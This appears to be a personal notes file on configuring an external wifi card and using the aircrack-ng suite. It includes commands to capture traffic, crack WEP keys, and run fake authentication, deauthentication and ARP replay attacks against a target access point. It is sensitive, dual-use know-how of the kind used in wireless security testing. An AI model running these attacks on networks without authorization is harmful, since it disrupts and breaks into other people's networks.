# Notes on wifi configs and setup

## Keeping interface names
I was having issues with the external card until adjusting the below.
```bash
$ vim /etc/default/grub
GRUB_CMDLINE_LINUX="net.ifnames=0 biosdevname=0"
```

## Renaming interface
Rename target interface to `wlan1` instead of systemd generated name.
```bash
$ vim /etc/udev/rules.d/10-network-device.rules
SUBSYSTEM=="net", ACTION=="add", DRIVERS=="?*", ATTR{address}=="AC:65:21:B7:2E:60", ATTR{dev_id}=="0x0", ATTR{type}=="1", KERNEL=="eth*", NAME="wlan1"
$ systemctl restart network-manager.service
```

## airodump-ng
Find surrounding networks, access points and clients
```bash
$ airodump-ng wlan1
```

Begin collection on target channel, BSSID and recording to file.
  - `-c` Select channel number
  - `-w` Write to file
  - `--bssid` MAC address of access point
  - `--ivs` Save only captured IVs
```bash
$ airodump-ng -c 6 --bssid E0:05:C5:60:2E:65 --ivs -w capture  wlan1
```

## aircrack-ng
Begin cracking IVS file on target BSSID (can perform while airodump-ng is writing).
```bash
$ aircrack-ng capture-01.ivs --bssid E0:05:C5:60:2E:65
```

Invoke PTW WEP cracking method method on an arp replay.
```bash
$ aircrack-ng -z replay_arp-0309-015802.cap
```

## aireplay-ng
Set attack mode [Fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication).
  - `-1` Set `-1` count
  - `-o` Number of packets to send at a time
  - `-q` Number of seconds to send keep-alive packets
  - `-e` Filename to write
  - `-a` Target access point MAC address
```bash
$ aireplay-ng -1 180 -o 1 -q 10 -e capture -a A0:21:B7:60:2E:65 wlan1
```

Set attack mode [deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication).
  - `--deauth` Set `deauth` count
  - `-e` Target access point ESSID
  - `-a` Target access point MAC address
  - `-c` Set desitnation MAC address
```bash
$ aireplay-ng --deauth 5 -e access_point -a A0:21:B7:60:2E:65 -c AC:65:21:B7:2E:60 wlan1
```

Set attack mode [ARP request replay attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection).
  - `--arpreplay` attack mode
  - `-b` Target access point BSSID
  - `-h` Set source MAC address
  - `-r` Extract packets from target pcap file
  - `-x` Number of packets-per-second
```bash
$ aireplay-ng --arpreplay -b A0:21:B7:60:2E:65 -h AC:65:21:B7:2E:60 wlan1 -r replay_arp-0309-015533.cap -x 100
```

## Sources
[Aircrack-ng Newbie Guide for Linux](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
